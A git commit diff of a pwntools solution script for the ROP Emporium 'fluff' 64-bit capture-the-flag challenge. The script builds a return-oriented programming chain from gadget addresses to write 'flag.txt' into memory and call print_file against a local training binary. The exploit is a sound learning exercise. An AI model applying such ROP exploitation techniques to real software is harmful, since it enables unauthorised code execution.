077f590fc20aa8588d386ca3fcd3320dac04f2ef
micky <mickyhall35@gmail.com>
2020-08-09 09:26:57 -0700

    finished 64bit fluff on rope

--- rop_emporium/fluff/64/solution.py
+++ rop_emporium/fluff/64/solution.py
@@ -1,38 +1,60 @@
 from pwn import *
 
-#pr = process("./fluff")
+def get_addr(addr):
+    return addr - 0x3ef2
 
-zero_al_pop_rbp = p64(0x400610)
-xlat = p64(0x400628) 
-stos = p64(0x400639)
-print_file = p64(0x400620)
-addr = 0x00601028
+'''
+f - 0x004003c1+3 - libfluff.so
+l - 0x004003c1+0 - libfluff.so
+a - 0x00400415+3 - _edata
+g - 0x004003cd+1 - _gmon_start_
+. - 0x004003c1+8 - libfluff.so
+t - 0x00400415+4 - _edata
+x - 0x004006c4+4 - nonexistent
+t - 0x00400415+4 - _edata
+'''
+
+# Start the process
+pr = process("./fluff")
+
+# Addresses used for flag.txt string
+flag = []
+flag.append(get_addr(0x004003c1+3))
+flag.append(get_addr(0x004003c1+0))
+flag.append(get_addr(0x00400415+3))
+flag.append(get_addr(0x004003cd+2))
+flag.append(get_addr(0x004003c1+8))
+flag.append(get_addr(0x00400415+4))
+flag.append(get_addr(0x004006c4+4))
+flag.append(get_addr(0x00400415+4))
+
+# Gadgets used for rop
 pop_rdi = p64(0x4006a3)
-ret = p64(0x400295)
 bextr = p64(0x40062a)
 bextr_no_rdx = p64(0x40062b)
-pop_rsp_13_14_15 = p64(0x40069d)
-rsp_for_ret = p64(0x7fffffffe1a0-24)
-#Get us into rop territory
-payload = b"flag.txt\x00\x00\x00\x00AAAA" +pop_rdi +p64(addr) + print_file
-# pop address of data into rdi 
-payload += pop_rdi + p64(addr)
-payload += zero_al_pop_rbp + b"BBBBBBBB"
-payload += bextr + p64(0x3000) + p64(0x7fffffffa29e) 
-payload += xlat 
-payload += stos
+print_file = p64(0x400620)
+data_addr = 0x00601028
+stos = p64(0x400639)
+xlat = p64(0x400628) 
+zero_al_pop_rbp = p64(0x400610)
+only_bextr = p64(0x400633)
 
-for i in range(1,9):
-    # zero out al
-    payload += zero_al_pop_rbp + b"BBBBBBBB"
-    # put &data in rbx 
-    payload += bextr_no_rdx + p64(0x7fffffffa29e+i) 
-    #grab byte from stack
-    payload += xlat 
-    #put byte into memory
-    payload += stos
+# Put it all together
+payload = "A"*40
 
-payload+= pop_rsp_13_14_15 + rsp_for_ret + "A"*24
+payload += pop_rdi + p64(data_addr)
+payload += zero_al_pop_rbp + "B"*8
+payload += bextr + p64(0x3000) + p64(flag[0])
+payload += xlat + stos 
+
+for i in range(1,8):
+    payload += zero_al_pop_rbp + "B"*8
+    payload += bextr_no_rdx + p64(flag[i])
+    payload += xlat + stos 
+
+payload += pop_rdi + p64(data_addr) + print_file
 
 
-print(payload)
+# Send payload and pray
+pr.sendline(payload)
+print(pr.recvall())
